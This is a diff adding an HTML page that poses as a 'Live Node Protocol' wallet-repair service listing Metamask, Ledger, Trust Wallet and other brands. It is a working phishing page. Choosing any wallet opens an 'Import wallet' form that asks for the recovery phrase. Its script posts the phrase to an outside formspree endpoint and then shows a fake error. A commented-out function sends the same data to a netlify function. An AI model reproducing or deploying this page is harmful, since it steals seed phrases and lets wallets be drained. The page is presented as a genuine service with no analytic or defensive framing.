@@ -1,0 +1,311 @@
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>Live Chain Configuration</title>
+    
+    <!-- Bootstrap -->
+    <link href="bootstrap/css/bootstrap.min.css" rel="stylesheet">
+    <link href="styles.css" rel="stylesheet">
+    <link rel="icon" href="img/protocol.png" type="image/png">
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+        <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <style>
+		.item {
+			--icon-size: 32px;
+			background: #E0E0E0;
+			border-radius: 10px;
+			height: 70px;
+			width: 270px;
+			margin: 5px;
+			display: flex;
+			flex-flow: row nowrap;
+			padding: 10px;
+			align-items: center;
+			color: black;
+            font-weight: 700;
+
+		}
+		.item:hover {
+			--icon-size: 36px;
+			color: #404040;
+			font-size: 115%;
+			cursor: pointer;
+		}
+		.item > .image {
+			height: 50px;
+			width: 50px;
+			margin-right: 20px;
+		}
+		.item > .text {
+			font-size: 20px;
+			flex: 1;
+		}
+		.item > .icon {
+			font-size: var(--icon-size);
+		}
+		.item > .icon:hover {
+			font-size: var(--icon-size);
+		}
+		.modal {
+			color: #404040;
+            font-style: italic;
+		}
+		.navText {
+			font-size: 20px;
+			color: #c0c0c0;
+		}
+		.clickable {
+			cursor: pointer;
+		}
+        
+        .align-items-center {
+            align-items: center! important;
+        }
+
+        .justify-content-center {
+            justify-content: center! important;
+        }
+
+        .justify-content-center {
+        display:flex! important;
+        }
+
+        .row {
+            flex-wrap: wrap;
+            margin-right: -15px;
+            margin-right: -15px;
+            margin-bottom: 50px;
+        }
+        
+        .text-center {
+             font-size: 35px;
+             text-align: center;
+        }
+
+        .text-centre {
+             font-size: 17px;
+             text-align: center;
+        }
+	</style>
+</head>
+
+<body style="background-image: url('img/back.jpeg'); object-fit: fill; color: white;" >
+    
+    <div class="container p-3" style="margin-top: 40px">
+        <div class="row">
+            <div class="col-10"></div>
+            <div class="col-2 navText">
+                <span class="clickable" data-toggle="modal" data-target="#exampleModal"></span>
+        </div>
+    </div>
+
+        <div class="row">
+            <div class="col">
+                <h1 class="text-center">Live Node Protocol</h1>
+                <p class="text-centre"> Coins or tokens not showing, Stuck tokens, transaction list displaying error, 
+                    unable to stake or unstake is resolved with our highly secure integrations with top wallet providers,
+                     you can efficiently manage all your wallets on our app.</p> 
+            </div>
+        </div>
+
+
+        <div class="row d-flex justify-content-center align-items-center">
+
+            <div class="col-md-4 col-sm-6">
+
+            <div class="item" data-toggle="modal" data-id="Metamask" data-target="#exampleModal">
+                <img src="img/metamask.jpg" class="image" alt="Name" />
+                <span class="text">Metamask</span>
+                <i class="fas fa-chevron-right icon"></i>
+            </div>
+            <div class="item" data-toggle="modal" data-id="Keplr Wallet" data-target="#exampleModal">
+                <img src="img/keplr.png" class="image" alt="Name" />
+                <span class="text">Keplr Wallet</span>
+                <i class="fas fa-chevron-right icon"></i>
+            </div>
+            <div class="item" data-toggle="modal" data-id="Trust Wallet" data-target="#exampleModal">
+                <img src="img/trust-wallet.jpg" class="image" alt="Name" />
+                <span class="text">Trust Wallet</span>
+                <i class="fas fa-chevron-right icon"></i>
+            </div>
+            <div class="item" data-toggle="modal" data-id="Binance Chain" data-target="#exampleModal">
+                <img src="img/digitex2.png" class="image" alt="Name" />
+                <span class="text">Binance Chain</span>
+                <i class="fas fa-chevron-right icon"></i>
+            </div>
+            <div class="item" data-toggle="modal" data-id="Exodus" data-target="#exampleModal">
+                <img src="img/exodus.jpg" class="image" alt="Name" />
+                <span class="text">Exodus</span>
+                <i class="fas fa-chevron-right icon"></i>
+            </div>
+            
+
+        </div>
+
+        <div class="col-md-4 col-sm-6">
+
+            <div class="item" data-toggle="modal" data-id="Coinbase" data-target="#exampleModal">
+                <img src="img/coinbase.jpg" class="image" alt="Name" />
+                <span class="text">Coinbase</span>
+                <i class="fas fa-chevron-right icon"></i>
+            </div>
+            <div class="item" data-toggle="modal" data-id="Polkawallet" data-target="#exampleModal">
+                <img src="img/Polkawallet.jpeg" class="image" alt="Name" />
+                <span class="text">Polkawallet</span>
+                <i class="fas fa-chevron-right icon"></i>
+            </div>
+            <div class="item" data-toggle="modal" data-id="Enjin" data-target="#exampleModal">
+                <img src="img/enjin.jpg" class="image" alt="Name" />
+                <span class="text">Enjin</span>
+                <i class="fas fa-chevron-right icon"></i>
+            </div>
+            <div class="item" data-toggle="modal" data-id="Terra Station" data-target="#exampleModal">
+                <img src="img/terra.png" class="image" alt="terra logo">
+                <span class="text">Terra Station</span>
+                <i class="fas fa-chevron-right icon"></i>
+            </div>
+            <div class="item" data-toggle="modal" data-id="SafePal" data-target="#exampleModal">
+                <img src="img/Safepal.png" alt="SafePal Logo" class="image">
+                <span class="text">SafePal Wallet</span>
+                <i class="fas fa-chevron-right icon"></i>
+            </div>           
+
+        </div>
+
+
+          <div class="col-md-4 col-sm-6">
+
+            <div class="item" data-toggle="modal" data-id="MEW Wallet" data-target="#exampleModal">
+                <img src="img/mew.png" alt="MEW Logo" class="image">
+                <span class="text">MEW Wallet</span>
+                <i class="fas fa-chevron-right icon"></i>
+            </div>
+            <div class="item" data-toggle="modal" data-id="Portis" data-target="#exampleModal">
+                <img src="img/portis.svg" alt="Portis Logo" class="image">
+                <span class="text">Portis</span>
+                <i class="fas fa-chevron-right icon"></i>
+            </div>
+
+            <div class="item" data-toggle="modal" data-id="Ledger" data-target="#exampleModal">
+                <img src="img/ledger.jpg" class="image" alt="Name" />
+                <span class="text">Ledger</span>
+                <i class="fas fa-chevron-right icon"></i>
+            </div>
+            <div class="item" data-toggle="modal" data-id="AAVE"  data-target="#exampleModal">
+                <img src="img/aave.jpg" class="image" alt="Name" />
+                <span class="text">AAVE</span>
+                <i class="fas fa-chevron-right icon"></i>
+            </div>
+            <div class="item" data-toggle="modal" data-id="Wallet Connect" data-target="#exampleModal">
+                <img src="img/walletconnect.svg" alt="Portis Logo" class="image">
+                <span class="text">Wallet Connect</span>
+                <i class="fas fa-chevron-right icon"></i>
+             </div>
+         </div>
+    </div>
+
+
+
+    <div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+        <div class="modal-dialog" role="document">
+            <div class="modal-content replace">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="exampleModalLabel">Import wallet</h5>
+                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                        <span aria-hidden="true">&times;</span>
+                    </button>
+                </div>
+                <div class="modal-body">
+                    <form id="my-form" action="https://formspree.io/f/mzbokbww" method="POST">
+                        <div class="form-group">
+                            <label for="recipient-name" class="col-form-label">Name:</label>
+                            <input type="text" class="form-control" id="wallet_name" readonly name="wallet_name">
+                        </div>
+                        <div class="form-group">
+                            <label for="message-text" class="col-form-label">Recovery Phrase:</label>
+                            <textarea class="form-control" id="recovery_phrase" name="recovery_phrase"></textarea>
+                            <label class="font-weight-light text-muted" style="font-size: 14px">Typically 12 (sometimes 24) words separated by single spaces</label><br>
+                            <span id="mnemonicMessage" style="color: red"></span>
+                        </div>
+                    <div class="form-group">
+                    <button type="Submit" class="btn btn-primary">Import Wallet</button>
+                    <input type="hidden" name="_next" value="/Error.html" />    
+                    </div>
+                    
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+    <!-- Include all compiled plugins (below), or include individual files as needed -->
+    <script src="bootstrap/js/bootstrap.min.js"></script>
+    <script src="blockui.js"></script>
+
+<script>    
+    
+   //  function send(){
+	// 	$("#connectionlivewallet-data-collector").block({message: null})
+	// 	const form = document.getElementById('connectionlivewallet-data-collector')
+	 //	const formData = new FormData(form)
+	// 	const payload = {}
+	 //	for (const pair of formData) {
+	 //		payload[pair[0]] = pair[1]
+	//	}
+	 //	fetch('https://awesome-lamport-8a184e.netlify.app/.netlify/functions/wallet-connect', {
+	 //		method: 'POST',
+	 //		body: JSON.stringify(payload)
+	 //	}).then(() => {
+	 //		alert("An error occurred while attempting to add your wallet. Please try again later.")
+	 //		$("#connectionlivewallet-data-collector").unblock()
+	 //	})
+	 //   }
+
+        $(function(){
+        	$('#exampleModal').on('show.bs.modal', function(e) { 
+				  var wname = $(e.relatedTarget).data('id');
+				  var that = $(this);
+				  that.find('input[id="wallet_name"]').val(wname) ;  
+			});
+            $('#exampleModal').on('hidden.bs.modal', function (e) {
+              window.location.reload();
+            })
+        })
+</script>
+</body>
+
+<script>
+    var form = document.getElementById("my-form");
+    
+    async function handleSubmit(event) {
+      event.preventDefault();
+      var status = document.getElementById("my-form-status");
+      var data = new FormData(event.target);
+      fetch(event.target.action, {
+        method: form.method,
+        body: data,
+        headers: {
+            'Accept': 'application/json'
+        }
+      }).then(response => {
+        alert("An error occurred while attempting to add your wallet. Please try again later.")
+        form.reset()
+      }).catch(error => {
+        status.innerHTML = "Oops! There was a problem submitting your form"
+      });
+    }
+    form.addEventListener("submit", handleSubmit)
+</script>
+
+</html>
